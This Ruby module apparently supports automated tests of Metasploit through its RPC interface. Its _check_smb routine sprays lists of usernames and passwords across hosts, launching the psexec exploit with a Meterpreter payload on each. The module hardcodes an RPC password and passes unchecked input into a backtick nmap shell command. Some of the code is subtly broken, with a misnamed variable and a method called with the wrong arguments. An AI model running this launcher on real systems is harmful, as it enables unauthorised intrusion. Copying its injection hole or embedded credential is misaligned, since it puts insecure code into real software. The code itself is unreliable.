$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', '..', '..', 'lib'))

require 'msfrpc-client'
#require 'rex"

module Metaworld

	class Metadata
		attr_accessor :files

		def initialize
			@files = "/home/jcran/framework/external/metacuke/data"
		end
	end

	class Client
		attr_accessor :rpc
	
		def initialize
			@system = "127.0.0.1"
			@username = "jcran"
			@password = "bC}W0k8$"
			@port = "3790"
			
			begin
				@rpc  = Msf::RPC::Client.new(:host => @system, :port => @port, :user => @username, :pass => @password, :ssl => true )
			rescue Exception => e
				puts "Unable to connect"
			end
		end
			
		def do_something
			raise "Not implemented"
		end

		def run_module
			raise "Not Implemented"
		end
	end
	
	def setup
		@client = Client.new
	end
	
	def scan_network(range)
		`nmap -oX /tmp/test #{range}`
	end

	def get_session_count
		self.setup unless @client
		session_list = @client.rpc.call("session.list")
		
		if session_list
			return session_list.count
		else
			return 0 
		end
	end

	def check_logins(type="smb",systems,usernames,passwords)
		self.setup unless @client

		systems = systems.split("\n")
		usernames = usernames.split("\n")
		passwords = passwords.split("\n")

		if type == "smb"
			_check_smb(systems,usernames,passwords)
		elsif type == "ssh"
			_check_ssh(systems,usernames,passwords)
		else 
			raise "Don't know how to test for that"
		end
	end
	
private
	def _check_ssh
		raise "Don't know how to test ssh" 		
	end
	
	def _check_http
		raise "Don't know how to test http"	
	end
	
	def _check_smb(systems,usernames,passwords)
		systems.each do |system|
			usernames.each do |username|
				passwords.each do |password|
					module_type = "exploit"
					module_name = "windows/smb/psexec"
					payload_name = "windows/meterpreter/bind_tcp"
					option_string = "SMBUser=#{username},SMBPass=#{password},RHOST=#{system}"
	
					# Start out with an empty settings hash	and pull out each of the options
					options_hash = {}
					options_string.split(",").each{ |setting| options_hash["#{setting.split("=").first}"] = setting.split("=").last }

					# Set a default payload unless it's already been set by the user
					options_hash["PAYLOAD"] = "windows/meterpreter/bind_tcp" unless options_hash["PAYLOAD"]
	
					# Set a default target unless it's already been set by the user
					options_hash["TARGET"] = 0 unless options_hash["TARGET"]
		
					# then call execute
					@client.rpc.call("module.execute", module_type, module_name, options_hash)	
				end
			end
		end		
	end
	
end
